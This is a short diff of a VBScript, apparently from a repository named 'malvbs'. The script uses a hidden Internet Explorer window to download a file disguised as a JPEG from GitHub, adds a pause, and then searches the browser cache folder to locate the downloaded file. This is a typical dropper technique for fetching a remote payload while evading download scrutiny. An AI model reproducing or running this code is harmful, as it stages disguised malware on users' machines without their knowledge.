@@ -6,6 +6,7 @@ HomeFolder = oShell.ExpandEnvironmentStrings("%USERPROFILE%")
 Set IE = CreateObject("InternetExplorer.Application")
 IE.Visible = False
 IE.Navigate "https://github.com/nukeduk/malvbs/blob/master/lord.jpg?raw=true"
+WScript.Sleep 1000
 
 Set fso = CreateObject("Scripting.FileSystemObject")
 finder fso.GetFolder(HomeFolder+"\AppData\Local\Microsoft\Windows\INetCache\Low\IE")
